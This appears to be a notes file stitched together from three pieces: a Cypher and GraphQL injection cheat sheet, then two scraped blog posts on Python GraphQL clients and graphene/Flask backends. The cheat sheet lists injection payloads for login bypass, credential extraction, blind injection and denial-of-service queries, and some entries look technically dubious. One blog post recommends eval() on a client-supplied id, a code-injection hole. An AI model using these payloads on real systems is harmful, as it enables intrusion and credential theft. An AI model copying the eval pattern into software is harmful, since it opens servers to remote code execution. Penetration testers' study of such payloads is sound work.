# Cypher & GraphQL Injection Cheat Sheet


---

## Cypher Injection

| Scenario                         | Payload Example                                       | Notes                                                                                  |
| -------------------------------- | ----------------------------------------------------- | -------------------------------------------------------------------------------------- |
| **Authentication Bypass**        | `username: ' OR 1=1 //`<br>`password: anything`       | Uses `OR 1=1` and `//` to skip password check.                                         |
| **Comment Out Remainder**        | `' MATCH (n) RETURN n //`                             | Inject after quote to comment out rest of original query.                              |
| **Union-Style Data Extraction**  | `' MATCH (u:User) RETURN u.username, u.password //`   | If app echoes columns, can exfiltrate user credentials.                                |
| **Stacked Queries**              | `'; CALL dbms.query('MATCH (n) RETURN n LIMIT 5') //` | In Neo4j 4.x+ you can run arbitrary Cypher via `CALL dbms.query`.                      |
| **Error-Based Info Leak**        | `id: 1) WITH 1/0 AS x RETURN x //`                    | Trigger divide-by-zero to reveal error messages (and possibly query structure).        |
| **Time-Based Blind**             | `id: 1) CALL apoc.util.sleep(5000) RETURN 'pong' //`  | Use APOC sleep to delay response when a condition is true (if APOC plugin is enabled). |
| **Label & Property Enumeration** | `' MATCH (n) RETURN labels(n), keys(n) LIMIT 5 //`    | Dynamically list node labels and property keys.                                        |

---

## GraphQL Injection

| Scenario                              | Payload Example                                                                              | Notes                                                                                     |
| ------------------------------------- | -------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------- |
| **Introspection Discovery**           | `query { __schema { types { name fields { name } } } }`                                      | Enumerate all types and their fields exposed by the API.                                  |
| **Union / Inline Fragment Injection** | `{ user(id:1) { ... on Admin { secretKey } ... on User { name } } }`                         | Test for unexpected fragments or elevated-privilege fields.                               |
| **Argument-Based Injection**          | `{ user(id:"1\" OR \"1\"=\"1") { id name } }`                                                | Classic OR-based bypass inside a quoted argument.                                         |
| **Mutation Abuse**                    | `mutation { createUser(username:"attacker", password:"pass"); __schema { types { name } } }` | If multiple operations allowed, append introspection to a mutation.                       |
| **Batching / Deep Query**             | `{ search(q:"a"){ results { ... on User{id name friends{ id name friends{ id } } } } } }`    | Craft deeply nested selections to test for depth limits or induce DoS.                    |
| **Error-Based Leak**                  | `{ user(id:1) { posts(filter:"<script>alert(1)</script>") } }`                               | If server echoes arguments in errors, injection results may appear in the error response. |
| **Time-Based Blind (Apollo)**         | `mutation { delay(ms:5000) @client }`                                                        | Some Apollo setups support client-side directives that can be abused to delay responses.  |

---

## Additional Techniques & Tools

| Technique / Tool            | Payload / Command                                                     | Notes                                                       |
| --------------------------- | --------------------------------------------------------------------- | ----------------------------------------------------------- |
| **Boolean-Based Blind**     | `id:"1\" AND substring((SELECT password FROM User LIMIT 1),1,1)='a"`  | Pivot to blind-injection when no errors are returned.       |
| **Rate- & Depth-Limiting**  | Deep query: `127.0.0.1:8080/graphql?query={a{b{c{…}}}}`               | Many GraphQL servers enforce max depth—probe to map limits. |
| **Neo4j-Browser**           | —                                                                     | Use for live Cypher injection experiments.                  |
| **GraphiQL / Insomnia**     | —                                                                     | Craft, replay, and fuzz GraphQL queries.                    |
| **Burp Suite + Extensions** | **GraphQL** plugin for automated introspection and injection testing. | Integrate into your normal Burp workflow.                   |

---


> * Always begin with schema discovery—Cypher via `CALL dbms.listQueries()` or GraphQL via introspection.
> * Leverage comments (`//`, `/*…*/`) to truncate original queries.
> * Record response times for blind techniques.
> * Automate repetitive payloads with your favorite scripting language or Burp macros.



##
#
https://hackernoon.com/making-graphql-queries-in-python-like-a-boss
#
https://itnext.io/python-graphql-tips-tricks-and-performance-improvements-beede1f4adb6
#
##

Making GraphQL Queries in Python Like a Boss
January 31st 2023
3min by @pizzapanther
Paul Bailey HackerNoon profile picture

1,578 reads
Open TLDRtldt arrow
Read on Terminal Reader
Print this story
Read this story w/o Javascript
Too Long; Didn't Read
SGQLC in Python is a totally awesome GraphQL library. Use it today if you want to write fast, compact GraphQL queries.
featured image - Making GraphQL Queries in Python Like a Boss
programming
#web-development
#graphql
#python
#graphql-api
#graphql-queries
#python-programming
#python-tutorials
#learn-python
1x
Read by Dr. One (en-US)voice-avatar
Audio Presented by
Descope-icon
Paul Bailey HackerNoon profile picture
@pizzapanther
Paul Bailey

Father, web developer, and pizza maker; Software Entomolo...

Receive Stories from @pizzapanther

GraphQL is a newer way to create APIs that are very flexible and give users more control over how they use your API. However, with this extra control in your hands, it puts more effort on your part on how to call the GraphQL API. Unlike a REST API which you call and then receive a response determined by the API developer, with a GraphQL API, you have to develop queries to pull out information that is important to you. In Python there are several client libraries that can help you call GraphQL APIs more easily.
GraphQL Clients

Python has a few GraphQL clients that work really well. While you can use a general HTTP call in Python or a general library like HTTPX or Requests, GraphQL-specific clients make it much easier to generate queries, insert variables, and listen to subscriptions. Below are a few libraries I found in the past that work well.


    GQL is a GraphQL client that includes the most features, so if you want a way to make GraphQL queries with all the bells and whistles, this library is for you.
    Python GraphQL Client is a smaller client that still has support for many GraphQL features. This library has fewer dependencies and is smaller and sometimes can be easier to install if you are having version conflicts with GQL.

Take A Different Approach: SGQLC

While Python GraphQL libraries are great and help you to generate and make queries more easily, you still have to put in the effort to figure out which queries you want to make. This means exploring your GraphQL API and deciding which parameters you want, and then creating a query to pull the information you want. Simple GraphQL Client - SGQLC takes a different approach. SGQLC gives you tools to generate a Python library out of a GraphQL schema. Once you have your custom library built, you can use it to make GraphQL calls even easier. Below I'll walk you through its usage.
1. Download your GraphQL Schema

First download your GraphQL schema into a JSON dump.

python3 -m sgqlc.introspection https://myapp.com/graphql schema.json
2. Create a Custom Python Library

Now that you have a JSON schema you can convert it to a custom Python library.

sgqlc-codegen schema schema.json schema.py
3. Use Your Custom Library in Your Python Code

Now that you have a custom Python library, you can use Python without writing queries to call your GraphQL API.


Selecting Default Fields


This gets the first 100 issues from a selected repository on Github.

from sgqlc.operation import Operation
from sgqlc.endpoint.requests import RequestsEndpoint

from schema import schema

# Generate a Query
op = Operation(schema.Query)
op.repository(owner=owner, name=name).issues(first=100)

# Call the endpoint
headers = {'Authorization': 'bearer TOKEN'}
endpoint = RequestsEndpoint("http://server.com/graphql", headers)

# data as a dictionary
data = endpoint(op)

# convert to Python objects
repo = (op + data).repository
for issue in repo.issues.nodes:
    print(issue)


The last step that converts the data to Python objects is optional. Sometimes going through large dictionaries of data can be difficult, so converting the data to Python objects can be extremely helpful.


This example selects the default fields for issues. These are all fields that are not relationships to other types. If you wish to change this, you can also select fields manually.


Selecting Fields Manually

op = Operation(schema.Query)
issues = op.repository(owner=owner, name=name).issues(first=100)

# select number and title field
issues.nodes.number()
issues.nodes.title()

# selection pagination data
issues.page_info.__fields__('has_next_page')
issues.page_info.__fields__(end_cursor=True)


Making a Mutation

Calling mutations is just as easy. Below is a login mutation example.

op = Operation(schema.Mutation)
mutation = op.login(input={'username': username, 'password': password})

# select errors and user data
mutation.errors()
mutation.user()

# call the endpoint
data = endpoint(op)

Wrapping It Up

For me, SGQLC takes calling GraphQL queries in Python to a whole new level of ease and compactness. I highly recommend implementing it into your Python tool belt. However, other Python libraries like GQL and Python GraphQL Client are also great tools for a more standard approach.



Write

Sign up

Sign In
Python & GraphQL. Tips, tricks and performance improvements.
Valery Tikhonov
ITNEXT

Valery Tikhonov
·

Follow
Published in

ITNEXT
·
6 min read
·
Jan 23, 2019

Recently I’ve finished another back-end with GraphQL, but now on Python. In this article I would like to tell you about all difficulties I’ve faced and narrow places which can affect the performance.

Technology stack: graphene + flask and sqlalchemy integration. Here is a piece of requirements.txt:

graphene
graphene_sqlalchemy
flask
flask-graphql
flask-sqlalchemy
flask-cors
injector
flask-injector

This allow me to map my database entities directly to GraphQL.

It looks like this:

The model.

class Color(db.Model):
  """color table"""
  __tablename__ = 'colors'

  color_id = Column(BigInteger().with_variant(sqlite.INTEGER(), 'sqlite'), primary_key=True)
  color_name = Column(String(50), nullable=False)
  color_r = Column(SmallInteger)
  color_g = Column(SmallInteger)
  color_b = Column(SmallInteger)

The node.

class ColorNode(SQLAlchemyObjectType):
  class Meta:
    model = colours.Color
    interfaces = (relay.Node,)

  color_id = graphene.Field(BigInt)

Everything is simple and nice.

But what are the problems?
Flask context.

At the time of writing this article I was unable to send my context to the GraphQL.

app.add_url_rule('/graphql',
                 view_func=GraphQLView.as_view('graphql',
                 schema=schema.schema,
                 graphiql=True,
                 context_value={'session': db.session})
                 )

This thing didn’t work for me, as view in flask-graphql integration was replaced by flask request.

Maybe this is fixed now, but I have to subclass GrqphQLView to save the context:

class ContexedView(GraphQLView):
  context_value = None

  def get_context(self):
    context = super().get_context()
    if self.context_value:
      for k, v in self.context_value.items():
        setattr(context, k, v)
    return context

CORS support

It is always a thing I forget to add :)

For Python Flask just add flask-cors in your requirements and set it up in your create_app method via CORS(app). That’s all.
Bigint type

I had to create my own bigint type, as I use it in the database as primary key in some columns. And there were graphene errors when I try to send int type.

class BigInt(Scalar):
  @staticmethod
  def serialize(num):
    return num

  @staticmethod
  def parse_literal(node):
    if isinstance(node, ast.StringValue) or isinstance(node, ast.IntValue):
      return int(node.value)

  @staticmethod
  def parse_value(value):
    return int(value)

Compound primary key

Also, graphene_sqlalchemy doesn’t support compound primary key out of the box. I had one table with (Int, Int, Date) primary key. To make it resolve by id via Relay’s Node interface I had to override get_node method:

@classmethod
def get_node(cls, info, id):
  import datetime
  return super().get_node(info, eval(id))

datetime import and eval are very important here, as without them date field will be just a string and nothing will work during querying the database.
Mutations with authorization

It was really easy to make authorization for queries, all I needed is to add Viewer object and write get_token and get_by_token methods, as I did many times in java before.

But mutations are called bypassing Viewer and its naturally for GraphQL.

I didn’t want to add authorization code in every mutation’s header, as it leads to code duplication and it’s a little bit dangerous, as I may create a backdoor by simply forgetting to add this code.

So I’ve subclass mutation and reimplement it’s mutate_and_get_payload like this:

class AuthorizedMutation(relay.ClientIDMutation):
  class Meta:
    abstract = True

  @classmethod
  @abstractmethod
  def mutate_authorized(cls, root, info, **kwargs):
    pass

  @classmethod
  def mutate_and_get_payload(cls, root, info, **kwargs):
    # authorize user using info.context.headers.get('Authorization')
    return cls.mutate_authorized(root, info, **kwargs)

All my mutations subclass AuthorizedMutation and just implement their business logic in mutate_authorized. It is called only if user was authorized.
Sortable and Filterable connections

To have my data automatically sorted via query in connection (with sorted options added to the schema) I had to subclass relay’s connection and implement get_query method (it is called in graphene_sqlalchemy).

class SortedRelayConnection(relay.Connection):
  class Meta:
    abstract = True

  @classmethod
  def get_query(cls, info, **kwargs):
    return SQLAlchemyConnectionField.get_query(cls._meta.node._meta.model, info, **kwargs)

Then I decided to add dynamic filtering over every field. Also with extending schema.

Out of the box graphene can’t do it, so I had to add a PR and subclass connection once again:

class FilteredRelayConnection(relay.Connection):
  class Meta:
    abstract = True

  @classmethod
  def get_query(cls, info, **kwargs):
    return FilterableConnectionField.get_query(cls._meta.node._meta.model, info, **kwargs)

Where FilterableConnectionField was introduced in the PR.
Sentry middleware

We use sentry as error notification system and it was hard to make it work with graphene. Sentry has good flask integration, but problem with graphene is — it swallows exceptions returning them as errors in response.

I had to use my own middleware:

class SentryMiddleware(object):

  def __init__(self, sentry) -> None:
    self.sentry = sentry

  def resolve(self, next, root, info, **args):
    promise = next(root, info, **args)
    if promise.is_rejected:
      promise.catch(self.log_and_return)
    return promise

  def log_and_return(self, e):
    try:
      raise e
    except Exception:
      traceback.print_exc()
      if self.sentry.is_configured:
      if not issubclass(type(e), NotImportantUserError):
        self.sentry.captureException()
    return e

It is registered on GraphQL route creation:

app.add_url_rule('/graphql',
                 view_func=ContexedView.as_view('graphql',
                 schema=schema.schema,
                 graphiql=True,
                 context_value={'session': db.session},
                 middleware=[SentryMiddleware(sentry)]
                )

Low performance with relations

Everything was well, tests were green and I was happy till my application went to dev environment with real amounts of data. Everything was super slow.

The problem was in sqlalchemy’s relations. They are lazy by default.

It means — if you have graph with 3 relations: Master -> Pet -> Food and query them all, first query will receive all masters (select * from masters`). F.e. you’ve received 20. Then for each master there will be query (select * from pets where master_id = ?). 20 queries. And finally – N food queries, based on pet return.

My advice here — if you have complex relations and lots of data (I was writing back-end for big data world) you have to make all relations eager. The query itself will be harder, but it will be only one, reducing response time dramatically.
Performance improvement with custom queries

After I made my critical relations eager (not all relations, I had to study front-end app to understand what and how they query) everything worked faster, but not enough. I looked at generated queries and was a bit frightened — they were monstrous! I had to write my own, optimized queries for some nodes.

F.e. if I have a PlanMonthly entity with several OrderColorDistributions, each of it having one Order.

I can use subqueries to limit the data (remember, I am writing back-end for big data) and populate relations with existing data (I anyway had this data in the query, so there was no need to use eager joins, generated by ORM). It will facilitates the request.

Steps:

    Mark subqueries with_labels=True

2. Use root’s (for this request) entity as return one:

Order.query \
  .filter(<low level filtering here>) \
  .join(<join another table, which you can use later>) \
  .join(ocr_query, Order.order_id == ocr_query.c.order_color_distribution_order_id) \
  .join(date_limit_query,
        and_(ocr_query.c.order_color_distribution_color_id == date_limit_query.c.plans_monthly_color_id,
             ocr_query.c.order_color_distribution_date == date_limit_query.c.plans_monthly_date,
             <another table joined previously> == date_limit_query.c.plans_monthly_group_id))

3. Use contains_eager on all first level relations.

query = query.options(contains_eager(Order.color_distributions, alias=ocr_query))

4. If you have second layer of relations (Order -> OrderColorDistribution -> PlanMonthly) chain contains_eager:

query = query.options(contains_eager(Order.color_distributions, alias=ocr_query)
             .contains_eager(OrderColorDistribution.plan, alias=date_limit_query))

Reducing number of calls to the database

Besides data rendering level I have my service layer, which knows nothing about GraphQL. And I am not going to introduce it there, as I don’t like high coupling.

But each service needs fetched months data. To use all the data only once and have it in all services, I use injector with @request scope. Remember this scope, it is your friend in GraphQL.

It works like a singleton, but only within one request to /graphql. In my connection I just populate it with plans, found via GraphQL query (including all custom filters and ranges from front-end):

app.injector.get(FutureMonthCache).set_months(found)

Then in all services, which need to access this data I just use this cache:

@inject
def __init__(self,
             prediction_service: PredictionService,
             price_calculator: PriceCalculator,
             future_month_cache: FutureMonthCache) -> None:
  super().__init__(future_month_cache)
  self._prediction_service = prediction_service
  self._price_calculator = price_calculator

Another nice thing is — all my services, which manipulate data and form the request have also @request scope, so I don’t need to calculate predictions for every month. I take them all from cache, do one query and store the results. Moreover, one service can rely on other service’s calculated data. Request scope helps a lot here, as it allows me to calculate all data only once.

On the Node side I call my request scope services via resolver:

def resolve_predicted_pieces(self, _info):
  return app.injector.get(PredictionCalculator).get_original_future_value(self)

It allows me to run heavy calculations only if predicted_pieces were specified in the GraphQL query.
Summing up

That’s all difficulties I’ve faced. I haven’t tried websocket subscriptions, but from what I’ve learned I can say that Python’s GraphQL is more flexible, than Java’s one. Because of Python’s flexibility itself. But if I am going to work on high-load back-end, I would prefer not to use GraphQL, as it is harder to optimize.
Sign up to discover human stories that deepen your understanding of the world.
Free

Distraction-free reading. No ads.

Organize your knowledge with lists and highlights.

Tell your story. Find your audience.
Sign up for free
Membership

Access the best member-only stories.

Support independent authors.

Listen to audio narrations.

Read offline.

Join the Partner Program and earn for your writing.
Try for $5/month
GraphQL
Python
Backend
Performance
Flask

Valery Tikhonov
ITNEXT
Written by Valery Tikhonov
142 Followers
·Writer for 

ITNEXT

github.com/comtihon
Follow
More from Valery Tikhonov and ITNEXT
Ansible and Jenkins — automate your scritps
Valery Tikhonov

Valery Tikhonov

in

ITNEXT
Ansible and Jenkins — automate your scritps
The topic I’d like to reveal in this article may seem obvious, but I was surprised how many companies don’t follow this best practice.
·7 min read·Apr 26, 2019

1
Replace Dockerfile with Buildpacks
Mahdi Mallaki

Mahdi Mallaki

in

ITNEXT
Replace Dockerfile with Buildpacks
Exploring the Pros and Cons of Replacing Dockerfile with Buildpacks
6 min read·Oct 14

7
Automate Everything — Effortless Task Scheduling with Python’s Schedule Package
Jacob Ferus

Jacob Ferus

in

ITNEXT
Automate Everything — Effortless Task Scheduling with Python’s Schedule Package
Scheduled tasks are not just a common feature in programming, but a cornerstone of an efficient organization and a fundamental component in
·8 min read·Oct 1

8
Rollback for microservices with Ansible and Jenkins
Valery Tikhonov

Valery Tikhonov

in

ITNEXT
Rollback for microservices with Ansible and Jenkins
Imagine your project consists of 4 microservices (3 backends, 1 frontend). Yesterday you introduced several new features and made a…
·7 min read·Jun 17, 2019

See all from Valery Tikhonov
See all from ITNEXT
Recommended from Medium
Building a GraphQL API with FastAPI and Strawberry
Shikha Pandey

Shikha Pandey
Building a GraphQL API with FastAPI and Strawberry
In today’s digital landscape, the need for efficient and flexible APIs is more prevalent than ever. As applications grow in complexity and…
7 min read·Jul 16

1
OData vs GraphQL
Bernardo Teixeira

Bernardo Teixeira
OData vs GraphQL
As modern applications become more complex and data-intensive, efficient and flexible data retrieval from APIs becomes crucial. Two popular…
·4 min read·May 17

Lists
Coding & Development
11 stories·232 saves
Predictive Modeling w/ Python
20 stories·526 saves
Principal Component Analysis for ML
Time Series Analysis
deep learning cheatsheet for beginner
Practical Guides to Machine Learning
10 stories·604 saves
Databricks role-based and specialty certification line-up.
New_Reading_List
174 stories·159 saves
Google Rejected Max Howell(Creator Of Homebrew) For Getting This Interview Question Wrong. Can You?
Dr. Ashish Bamania

Dr. Ashish Bamania

in

Level Up Coding
Google Rejected Max Howell(Creator Of Homebrew) For Getting This Interview Question Wrong. Can You?
Can you solve this Google interview question?
·4 min read·Oct 3

66
GraphQL & Go: Powerful API Development with gqlgen & Go Bun
Zahid

Zahid
GraphQL & Go: Powerful API Development with gqlgen & Go Bun
In our previous blog posts, we explored and implemented REST APIs using in-memory slices, followed by an introduction to the Bun ORM with…
14 min read·Jul 8

The Architecture of a Modern Startup
Dmitry Kruglov

Dmitry Kruglov

in

Better Programming
The Architecture of a Modern Startup
Hype wave, pragmatic evidence vs the need to move fast
16 min read·Nov 7, 2022

63
Say Goodbye to Visio: The Future of Diagram Design is Here!
James Berger

James Berger
Say Goodbye to Visio: The Future of Diagram Design is Here!
Meet Azure Analytics Architecture Advisor – the latest architect tool that is set to revolutionise your approach to system architecture…
5 min read·Jun 23

7
See more recommendations

Help

Status

About

Careers

Blog

Privacy

Terms

Text to speech

Teams
